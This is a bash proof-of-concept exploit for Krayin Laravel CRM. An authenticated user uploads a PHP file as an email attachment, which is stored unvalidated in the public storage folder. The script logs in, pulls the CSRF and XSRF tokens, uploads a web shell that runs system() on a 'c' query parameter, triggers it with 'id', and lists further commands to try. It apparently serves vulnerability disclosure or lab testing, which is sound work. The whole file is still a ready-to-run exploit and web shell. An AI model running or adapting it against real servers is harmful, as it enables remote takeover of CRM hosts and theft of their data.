#!/usr/bin/env bash
# Krayin Laravel CRM — RCE via /admin/mail/create email attachment
#
# Auth: any logged-in user with the `mail.compose` ACL key (default in any
# real CRM workforce). Confirmed runtime against commit a2c1960 / v2.2.x.
#
# Sink: AttachmentRepository::prepareData() writes
#   storage/app/public/emails/<email_id>/<verbatim filename>
# on the default `public` disk, which `storage:link` exposes at
#   <APP_URL>/storage/emails/<email_id>/<filename>
# No filename / extension / MIME validation. The web server runs .php files
# placed there.
#
# Usage:
#   bash poc.sh [<target-url>] [admin|sales]
# Defaults: target=http://127.0.0.1:8000, profile=admin
#
# The profile selects the lab email address. The password is requested through
# a hidden prompt and is never stored in this script.

set -e
TARGET="${1:-http://127.0.0.1:8000}"
PROFILE="${2:-admin}"

case "$PROFILE" in
  admin) EMAIL="admin@example.com" ;;
  sales) EMAIL="sales@example.com" ;;
  *) echo "Unknown profile $PROFILE (use admin|sales)"; exit 1 ;;
esac

read -r -s -p "Password for $EMAIL: " PASSWORD
echo
if [ -z "$PASSWORD" ]; then
  echo "Password must not be empty."
  exit 2
fi

COOKIES=$(mktemp /tmp/krayin_cookies.XXXXXX)
EVIL=""
cleanup() {
  rm -f "$COOKIES"
  if [ -n "$EVIL" ]; then
    rm -f "$EVIL"
  fi
}
trap cleanup EXIT

echo "[1/5] Fetching login page CSRF token..."
LOGIN_HTML=$(curl -sk -c "$COOKIES" -b "$COOKIES" "$TARGET/admin/login")
TOKEN=$(echo "$LOGIN_HTML" | grep -oE 'name="_token"[^>]*value="[^"]+"' \
        | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')

echo "[2/5] Logging in as $EMAIL ..."
curl -sk -c "$COOKIES" -b "$COOKIES" \
  -X POST "$TARGET/admin/login" \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "email=$EMAIL" \
  --data-urlencode "password=$PASSWORD" \
  -o /dev/null -w "      HTTP %{http_code}\n"
unset PASSWORD

# Pull XSRF-TOKEN cookie value (URL-decoded). Laravel decrypts it in
# VerifyCsrfToken when sent as the X-XSRF-TOKEN request header.
XSRF=$(grep "XSRF-TOKEN" "$COOKIES" | awk '{print $7}' \
       | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))")

EVIL=$(mktemp /tmp/evil.XXXXXX.php)
cat >"$EVIL" <<'EOF'
<?php
echo "RCE-OK:".php_uname()."\n";
echo "USER=".get_current_user()."\n";
if (isset($_GET['c'])) { system($_GET['c']); }
EOF

echo "[3/5] POST /admin/mail/create with attachments[]=evil.php ..."
RESP=$(curl -sk -b "$COOKIES" \
  -X POST "$TARGET/admin/mail/create" \
  -H "X-XSRF-TOKEN: $XSRF" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Accept: application/json" \
  -F "reply_to[]=victim@example.com" \
  -F "reply=poc" \
  -F "is_draft=1" \
  -F "source=web" \
  -F "attachments[]=@$EVIL;filename=evil.php")
URL=$(echo "$RESP" \
  | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d["data"]["attachments"][0]["url"])' \
  2>/dev/null || true)
if [ -z "$URL" ]; then
  echo "[!] Could not extract attachment URL from response."
  echo "[!] Likely causes: not authenticated (check creds/role), CSRF mismatch (X-XSRF-TOKEN), or PHP type-hint regression."
  exit 2
fi

# Convert the absolute URL Krayin returns into a path on the live target.
PATHREL=$(echo "$URL" | sed -E 's|^https?://[^/]+/||')
echo "      saved at: $URL"

echo "[4/5] Triggering RCE: GET $TARGET/$PATHREL?c=id"
echo "      --- server response ---"
curl -sk "$TARGET/$PATHREL?c=id"
echo "      ------------------------"

echo "[5/5] Try arbitrary commands like:"
echo "      curl '$TARGET/$PATHREL?c=whoami'"
echo "      curl '$TARGET/$PATHREL?c=uname+-a'"
